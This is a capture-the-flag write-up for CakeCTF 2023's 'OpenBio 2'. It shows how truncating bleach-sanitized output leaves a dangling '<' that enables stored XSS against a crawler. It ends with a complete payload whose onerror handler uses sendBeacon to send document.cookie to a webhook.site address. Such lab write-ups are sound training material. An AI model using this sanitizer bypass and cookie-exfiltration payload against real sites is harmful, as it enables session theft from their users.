# OpenBio 2

## Description

> Share your Bio [here](http://openbio2.2023.cakectf.com:8011/)!
>
> \* Please [report us](http://openbio2.2023.cakectf.com:8012/) if you find any sensitive/harmful bio.
>
> Attachments: openbio2_3f76afa06e9c42e3ba9eed5866f8d97a.tar.gz

<details><summary>Attachment file tree</summary>

```console
$ tree openbio2
openbio2
├── crawler
│   ├── crawler.js
│   ├── Dockerfile
│   └── package.json
├── docker-compose.yml
├── redis
│   ├── Dockerfile
│   └── redis.conf
├── report
│   ├── app.py
│   ├── Dockerfile
│   ├── templates
│   │   └── index.html
│   └── uwsgi.ini
└── service
    ├── app.py
    ├── Dockerfile
    ├── templates
    │   ├── bio.html
    │   └── index.html
    └── uwsgi.ini

7 directories, 15 files
```

</details>

## Solution

Looking at the source code:

```javascript
// openbio2/crawler/crawler.js

    // (snip)

    const page = await browser.newPage();
    try {
        await page.setCookie({
            name: 'flag',
            value: flag,
            domain: new URL(base_url).hostname,
            httpOnly: false,
            secure: false
        });

    // (snip)
```

The purpose of this challenge is to get the flag set in the crawler's cookie.

```python
# openbio2/service/app.py

# (snip)

@app.route('/', methods=['GET', 'POST'])
def index():
    if flask.request.method == 'GET':
        return flask.render_template("index.html")

    err = None
    bio_id = os.urandom(32).hex()
    name = flask.request.form.get('name', 'Anonymous')
    email = flask.request.form.get('email', '')
    bio1 = flask.request.form.get('bio1', '')
    bio2 = flask.request.form.get('bio2', '')
    if len(name) > 20:
        err = "Name is too long"
    elif len(email) > 40:
        err = "Email is too long"
    elif len(bio1) > 1001 or len(bio2) > 1001:
        err = "Bio is too long"

    if err:
        return flask.render_template("index.html", err=err)

    db().set(bio_id, json.dumps({
        'name': name, 'email': email, 'bio1': bio1, 'bio2': bio2
    }))
    return flask.redirect(f"/bio/{bio_id}")

@app.route('/bio/<bio_id>')
def bio(bio_id):
    if not re.match("^[0-9a-f]{64}$", bio_id):
        return flask.redirect("/")

    bio = db().get(bio_id)
    if bio is None:
        return flask.redirect("/")

    bio = json.loads(bio)
    name = bio['name']
    email = bio['email']
    bio1 = bleach.linkify(bleach.clean(bio['bio1'], strip=True))[:10000]
    bio2 = bleach.linkify(bleach.clean(bio['bio2'], strip=True))[:10000]
    return flask.render_template("bio.html",
                                 name=name, email=email, bio1=bio1, bio2=bio2)

# (snip)
```

The bio1 and bio2 input value is required to have a length of less than or equal to 1001.
These values are sanitized by the [bleach](https://github.com/mozilla/bleach) library, and truncated to a length of 10000 characters.
The source code of `bleach.linkify` and `bleach.clean` is [bleach/bleach/\_\_init\_\_.py at v6.1.0](https://github.com/mozilla/bleach/blob/v6.1.0/bleach/__init__.py).

```html
<!-- web/openbio2/service/templates/bio.html -->
<!-- (snip) -->
      <div id="bio">{{ bio1 | safe }}{{ bio2 | safe }}</div>
<!-- (snip) -->
```

If I can do the following, it seems like XSS can be occured.

- bio1 variable: the last character is `<`
- bio2 variable: `img src=1 onerror=alert(1)>`

```python
>>> import bleach
>>> tmp = """!@#$%^&*()_+{}|[]\:";'<>?,./"""; bleach.linkify(bleach.clean(tmp, strip=True))
'!@#$%^&amp;*()_+{}|[]\\:";\'&lt;&gt;?,./'
>>> # replace & to &amp, < to &lt;, > to &gt;
>>> tmp = "a.co"; bleach.linkify(bleach.clean(tmp, strip=True))
'<a href="http://a.co" rel="nofollow">a.co</a>'

>>> def check(x):
...     sanitized = bleach.linkify(bleach.clean(x, strip=True))
...     print(f"orginal len: {len(x)}, len: {len(sanitized)}, last: {sanitized[9999] if len(sanitized) >= 10000 else None}")
...
>>> check("a.co")
orginal len: 4, len: 45, last: None
>>> check("&a.co")
orginal len: 5, len: 50, last: None
>>> check("&a.co"*200)
orginal len: 1000, len: 10000, last: >
>>> check("<>"+"&a.co"*200)
orginal len: 1002, len: 10008, last: >
>>> check("<>"+"&a.co"*199)
orginal len: 997, len: 9958, last: None
>>> check("<>a.co"+"&a.co"*199)
orginal len: 1001, len: 10003, last: <
```

I can get the flag by using the following input:

bio1 (without newline):

```text
<>a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co&a.co
```

bio2 (`>` is not needed because the browser completes it):

```text
img src=1 onerror="navigator.sendBeacon('https://webhook.site/<your webhook>',document.cookie)"
```
